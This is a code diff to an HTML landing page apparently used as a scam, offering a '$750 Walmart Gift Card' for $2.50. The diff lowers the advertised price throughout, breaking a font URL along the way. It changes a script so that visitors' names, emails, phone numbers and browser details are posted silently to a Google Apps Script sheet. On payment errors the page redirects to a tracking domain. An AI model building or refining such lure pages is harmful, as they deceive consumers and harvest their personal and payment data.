@@ -13,7 +13,7 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Get your $750 Walmart Gift Card for $750!</title>
+  <title>Get your $750 Walmart Gift Card for $2.50!</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
@@ -80,7 +80,7 @@
     <!-- STEP 1 -->
     <section id="step1" class="card step" aria-hidden="false">
       <h1 class="title">
-        Get Your Walmart $750 Gift Card for <span id="priceHero" data-price> $750</span>!
+        Get Your Walmart $750 Gift Card for <span id="priceHero" data-price> $2.50</span>!
       </h1>
       <p class="sub">Limited-time offer!</p>
 
@@ -147,7 +147,7 @@
 
       <div class="btn-row">
         <button id="backBtn" class="btn muted-btn">← Back</button>
-        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$750</span> Securely</button>
+        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$2.50</span> Securely</button>
       </div>
 
       <div class="brands">
@@ -592,7 +592,7 @@
       if(pm.error){hideLoading();showError(pm.error.message);window.location.href="https://track.gandexo.com.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";return}
 
       try{
-        // Create the $750 charge PaymentIntent on your server
+        // Create the $2.50 charge PaymentIntent on your server
         const res=await fetch(SUBSCRIBE_URL,{
           method:"POST",
           headers:{"Content-Type":"application/json"},
@@ -662,20 +662,26 @@
 
         if (!email) return;
 
+        /* ==== CHANGED: make a simple, CORS-safe POST to Apps Script ==== */
+        const body = new URLSearchParams({
+          full_name: fullName,
+          email,
+          phone_national: national,
+          country_iso2: iso2,
+          country_name: countryName,
+          country_dial: dial,
+          source_url: location.href,
+          user_agent: navigator.userAgent
+        });
+
         fetch(SHEET_WEBAPP_URL, {
           method: "POST",
-          headers: { "Content-Type": "text/plain" },
-          body: JSON.stringify({
-            full_name: fullName,
-            email,
-            phone_national: national,
-            country_iso2: iso2,
-            country_name: countryName,
-            country_dial: dial,
-            source_url: location.href,
-            user_agent: navigator.userAgent
-          })
+          mode: "no-cors",
+          keepalive: true,
+          headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+          body
         }).catch(()=>{});
+        /* ==== END CHANGE ==== */
       } catch (_) {}
     }
 
